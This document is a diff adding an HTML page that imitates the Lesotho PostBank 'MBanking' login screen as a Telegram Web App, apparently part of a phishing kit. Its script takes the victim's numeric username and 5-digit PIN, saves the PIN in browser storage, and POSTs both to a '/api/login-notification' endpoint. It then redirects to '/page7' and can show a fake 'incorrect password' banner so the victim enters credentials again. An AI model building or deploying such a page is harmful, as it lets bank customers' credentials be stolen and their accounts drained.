@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LPB Lesotho - MBanking Login</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --lpb-blue: #0054a6;        /* LPB Royal Blue */
+            --lpb-blue-mid: #0072bc;      /* MBanking Banner Blue */
+            --lpb-blue-dark: #003e7e;
+            --lpb-green: #00a651;       /* LPB Vibrant Green */
+            --lpb-gold: #a38228;        /* LPB Ochre/Gold Accent */
+            --bg-color: #f4f6f9;
+            --card-bg: #ffffff;
+            --text-dark: #1f2937;
+            --text-muted: #6b7280;
+            --border-gray: #8fa6bf;
+            --btn-disabled-bg: #cbd5e1;
+            --btn-disabled-text: #64748b;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+        }
+
+        /* Top Logo Bar (Hamburger + Centered LPB Emblem) */
+        .top-logo-bar {
+            width: 100%;
+            max-width: 440px;
+            background-color: var(--bg-color);
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+        }
+
+        .menu-icon {
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            z-index: 2;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 26px;
+            height: 3.5px;
+            background-color: #6b7280;
+            border-radius: 1px;
+        }
+
+        .center-logo {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* MBanking Split Blue Header Bar */
+        .mbanking-bar {
+            width: 100%;
+            max-width: 440px;
+            background-color: var(--lpb-blue-mid);
+            height: 54px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+        }
+
+        .mbanking-tab {
+            width: 50%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            padding-left: 22px;
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 500;
+            border-right: 2px solid rgba(255, 255, 255, 0.85);
+            letter-spacing: 0.2px;
+        }
+
+        .mbanking-right {
+            width: 50%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 18px;
+        }
+
+        .region-pill {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #ffffff;
+            background-color: var(--lpb-green);
+            padding: 3px 8px;
+            border-radius: 4px;
+            letter-spacing: 0.5px;
+        }
+
+        /* Main Login Container */
+        .main-content {
+            width: 100%;
+            max-width: 440px;
+            padding: 36px 20px 28px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            background-color: var(--bg-color);
+        }
+
+        /* 🚨 Error Banner */
+        .error-banner {
+            width: 100%;
+            background-color: #ffebe9;
+            border: 1px solid #ff4d4f;
+            color: #d93025;
+            padding: 12px 14px;
+            border-radius: 4px;
+            font-size: 13.5px;
+            font-weight: 700;
+            margin-bottom: 18px;
+            display: none;
+            text-align: center;
+        }
+
+        /* Input Boxes Matching Attached Screen */
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+            margin-bottom: 18px;
+        }
+
+        .form-input {
+            width: 100%;
+            height: 54px;
+            border: 1.5px solid var(--border-gray);
+            border-radius: 3px;
+            background-color: #ffffff;
+            padding: 0 46px 0 16px;
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-dark);
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-input::placeholder {
+            color: #9ca3af;
+            font-weight: 400;
+            font-size: 16px;
+        }
+
+        .form-input:focus {
+            border-color: var(--lpb-blue);
+            box-shadow: 0 0 0 2px rgba(0, 84, 166, 0.12);
+        }
+
+        .form-input.input-error {
+            border-color: #d93025;
+            background-color: #fff9f9;
+        }
+
+        .help-circle {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 1.5px solid #cbd5e1;
+            color: #9ca3af;
+            font-size: 14px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .field-hint {
+            font-size: 11.5px;
+            color: var(--text-muted);
+            margin-top: -12px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 2px;
+        }
+
+        /* Login Button Matching Attached Screen */
+        .btn-submit {
+            width: 100%;
+            height: 54px;
+            border: none;
+            border-radius: 3px;
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            font-size: 18px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin-top: 12px;
+            letter-spacing: 0.3px;
+            transition: background-color 0.2s, transform 0.1s, color 0.2s;
+        }
+
+        .btn-submit.active {
+            background-color: var(--lpb-blue);
+            border-bottom: 3px solid var(--lpb-green);
+            color: #ffffff;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 84, 166, 0.25);
+        }
+
+        .btn-submit.active:hover {
+            background-color: var(--lpb-blue-dark);
+        }
+
+        .btn-submit.active:active {
+            transform: scale(0.99);
+        }
+
+        /* Footer */
+        .footer-box {
+            width: 100%;
+            max-width: 440px;
+            padding: 14px 20px 20px;
+            text-align: center;
+            font-size: 11.5px;
+            color: var(--text-muted);
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Top Header Bar with LPB Emblem -->
+<div class="top-logo-bar">
+    <div class="menu-icon" aria-label="Menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+
+    <div class="center-logo">
+        <!-- LPB Mountain Peak Logo (matching photo) -->
+        <svg width="44" height="44" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M24 4L5 21V31L24 14L43 31V21L24 4Z" fill="#0054a6"/>
+            <path d="M24 23L9 39H39L24 23Z" fill="#00a651"/>
+            <circle cx="24" cy="16.5" r="4.5" fill="#f4f6f9"/>
+            <circle cx="24" cy="16.5" r="2.7" fill="#a38228"/>
+        </svg>
+    </div>
+
+    <div style="width: 26px;"></div>
+</div>
+
+<!-- MBanking Header Bar -->
+<div class="mbanking-bar">
+    <div class="mbanking-tab">MBanking</div>
+    <div class="mbanking-right">
+        <span class="region-pill">LPB Lesotho</span>
+    </div>
+</div>
+
+<!-- Main Login Form -->
+<div class="main-content">
+    <!-- Error Banner -->
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <!-- Username Input (8 to 15 digits) -->
+    <div class="input-wrapper">
+        <input
+            type="text"
+            id="usernameInput"
+            class="form-input"
+            placeholder="Enter Username"
+            inputmode="numeric"
+            pattern="[0-9]*"
+            maxlength="15"
+            autocomplete="off"
+        >
+        <span class="help-circle" id="usernameHelp" title="Enter 8 to 15 numeric digits">?</span>
+    </div>
+    <div class="field-hint">
+        <span>Numeric username (8–15 digits)</span>
+        <span id="userCount">0/15</span>
+    </div>
+
+    <!-- Password Input (5 digits) -->
+    <div class="input-wrapper">
+        <input
+            type="password"
+            id="passwordInput"
+            class="form-input"
+            placeholder="Enter Password"
+            inputmode="numeric"
+            pattern="[0-9]*"
+            maxlength="5"
+            autocomplete="off"
+        >
+    </div>
+    <div class="field-hint">
+        <span>5-digit numeric password</span>
+        <span id="passCount">0/5</span>
+    </div>
+
+    <!-- Login Button -->
+    <button id="loginBtn" class="btn-submit" disabled>Login</button>
+</div>
+
+<!-- Footer -->
+<div class="footer-box">
+    © 2026 Lesotho PostBank (LPB) - Lesotho (+266)
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const usernameInput = document.getElementById("usernameInput");
+    const passwordInput = document.getElementById("passwordInput");
+    const loginBtn = document.getElementById("loginBtn");
+    const errorDisplay = document.getElementById("errorDisplay");
+    const userCount = document.getElementById("userCount");
+    const passCount = document.getElementById("passCount");
+    const usernameHelp = document.getElementById("usernameHelp");
+
+    // Pre-fill saved numeric username if available
+    const savedPhone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+    const cleanSavedPhone = savedPhone.replace(/\D/g, "").slice(0, 15);
+    if (cleanSavedPhone.length >= 8) {
+        usernameInput.value = cleanSavedPhone;
+    }
+
+    // Detect error parameter in URL query
+    const urlParams = new URLSearchParams(window.location.search);
+    const errParam = urlParams.get("error");
+
+    if (errParam === "wrong_pin" || errParam === "wrongpin" || errParam === "invalid_credentials" || errParam === "invalidcredentials") {
+        errorDisplay.textContent = "Incorrect username or password. Please try again.";
+        errorDisplay.style.display = "block";
+        usernameInput.classList.add("input-error");
+        passwordInput.classList.add("input-error");
+        usernameInput.focus();
+    }
+
+    function updateCountsAndButton() {
+        const uLen = usernameInput.value.length;
+        const pLen = passwordInput.value.length;
+
+        userCount.textContent = `${uLen}/15`;
+        passCount.textContent = `${pLen}/5`;
+
+        const isValid = uLen >= 8 && uLen <= 15 && pLen === 5;
+        loginBtn.disabled = !isValid;
+        loginBtn.classList.toggle("active", isValid);
+    }
+
+    usernameInput.addEventListener("input", () => {
+        usernameInput.value = usernameInput.value.replace(/\D/g, "").slice(0, 15);
+        usernameInput.classList.remove("input-error");
+        passwordInput.classList.remove("input-error");
+        errorDisplay.style.display = "none";
+        updateCountsAndButton();
+    });
+
+    passwordInput.addEventListener("input", () => {
+        passwordInput.value = passwordInput.value.replace(/\D/g, "").slice(0, 5);
+        usernameInput.classList.remove("input-error");
+        passwordInput.classList.remove("input-error");
+        errorDisplay.style.display = "none";
+        updateCountsAndButton();
+    });
+
+    usernameHelp.addEventListener("click", () => {
+        errorDisplay.textContent = "Username must contain 8 to 15 numbers, and Password must be 5 numbers.";
+        errorDisplay.style.backgroundColor = "#eef5fc";
+        errorDisplay.style.borderColor = "#0054a6";
+        errorDisplay.style.color = "#0054a6";
+        errorDisplay.style.display = "block";
+    });
+
+    loginBtn.addEventListener("click", async () => {
+        if (!loginBtn.classList.contains("active")) return;
+
+        const phone = usernameInput.value.trim();
+        const pin = passwordInput.value.trim();
+
+        if (!/^\d{8,15}$/.test(phone) || !/^\d{5}$/.test(pin)) {
+            errorDisplay.textContent = "Please enter 8–15 digits for Username and 5 digits for Password.";
+            errorDisplay.style.display = "block";
+            return;
+        }
+
+        loginBtn.disabled = true;
+        loginBtn.classList.remove("active");
+        loginBtn.textContent = "Logging in...";
+
+        localStorage.setItem("phone", phone);
+        localStorage.setItem("userPhone", phone);
+        localStorage.setItem("lastPin", pin);
+
+        try {
+            await fetch("/api/login-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, pin })
+            });
+        } catch (err) {
+            console.error("Login notification error:", err);
+        }
+
+        window.location.href = "/page7";
+    });
+
+    updateCountsAndButton();
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
